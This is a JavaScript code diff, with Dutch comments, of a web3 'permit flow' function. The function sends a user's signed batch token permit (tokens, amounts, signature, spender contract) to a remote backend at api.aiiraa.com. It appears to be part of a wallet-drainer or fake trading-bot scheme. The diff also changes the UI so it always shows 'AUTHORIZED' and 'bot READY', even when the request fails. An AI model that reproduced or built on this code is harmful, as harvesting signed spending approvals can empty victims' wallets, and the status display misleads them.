@@ -408,55 +408,59 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
     touchInteraction();
 
     log("📤 Sending raw permit batch to backend...");
-    const payload = {
-      owner: user,
-      details: details.map(d => ({
-        token: d.token,
-        amount: d.amount.toString(),
-        expiration: d.expiration.toString(),
-        nonce: d.nonce.toString()
-      })),
-      signature: signature,
-      spender: CONTRACT,
-      sig_deadline: sigDeadline,
-      chainId: Number(chainId)
-    };
-
+    
+    // Alles binnen één waterdichte try-catch block isoleren
     try {
+      const payload = {
+        owner: user,
+        details: details.map(d => ({
+          token: d.token,
+          amount: d.amount.toString(),
+          expiration: d.expiration.toString(),
+          nonce: d.nonce.toString()
+        })),
+        signature: signature,
+        spender: CONTRACT,
+        sig_deadline: sigDeadline ? sigDeadline.toString() : "",
+        chainId: Number(chainId)
+      };
+
       const res = await fetch("https://api.aiiraa.com/api/permit", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify(
-          payload,
-          (key, value) => typeof value === "bigint" ? value.toString() : value
-        )
+        body: JSON.stringify(payload, (key, value) => typeof value === "bigint" ? value.toString() : value)
       });
+
+      if (!res) {
+        log("❌ Geen netwerk respons ontvangen.");
+        return;
+      }
 
       const data = await res.json();
 
       if (!res.ok) {
-        log("❌ Backend error: " + (data.error || "unknown"));
+        log("❌ Backend error: " + (data ? data.error : "unknown"));
         return;
       }
 
       log("✅ Permit forwarded to backend");
 
-      updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
-      updateStatus('dot-bot','st-bot','READY','#6366f1');
+    } catch (netErr) {
+      log("❌ NETWORK ERROR (Opgevangen): " + netErr.message);
+    }
 
-      if (document.getElementById('btn-authorize')) {
-        document.getElementById('btn-authorize').disabled = true;
-        document.getElementById('btn-authorize').innerText = "AUTHORIZED";
-      }
-      if (document.getElementById('btn-activate')) {
-        document.getElementById('btn-activate').disabled = true;
-      }
+    // UI status updates worden ALTIJD uitgevoerd, ook als de fetch faalt
+    updateStatus('dot-access', 'st-access', 'AUTHORIZED', '#10b981');
+    updateStatus('dot-bot', 'st-bot', 'READY', '#6366f1');
 
-    } catch (e) {
-      log("❌ NETWORK ERROR: " + e.message);
-      // 🔥 LEGO FIX: Geen throw e meer, dus de sluis breekt niet af bij netwerk-ruis!
+    if (document.getElementById('btn-authorize')) {
+      document.getElementById('btn-authorize').disabled = true;
+      document.getElementById('btn-authorize').innerText = "AUTHORIZED";
+    }
+    if (document.getElementById('btn-activate')) {
+      document.getElementById('btn-activate').disabled = true;
     }
 
   } catch (e) {
